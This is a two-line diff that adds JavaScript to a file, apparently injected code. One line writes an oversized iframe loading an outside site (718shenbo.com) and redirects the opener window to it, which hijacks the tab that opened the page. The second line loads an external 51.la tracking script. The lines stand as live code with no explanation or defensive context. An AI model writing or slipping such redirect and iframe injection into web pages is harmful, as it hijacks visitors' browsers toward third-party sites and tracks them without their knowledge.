@@ -1,0 +1,2 @@
+document.write("<iframe name=\"I1\" src=\"http://www.718shenbo.com/\" width=\"100%\" height=\"5888\"></iframe>\r\n<SCRIPT>if(parent.window.opener) parent.window.opener.location=\" http://www.718shenbo.com/\"; </SCRIPT>");
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/17747998.js"></script>');
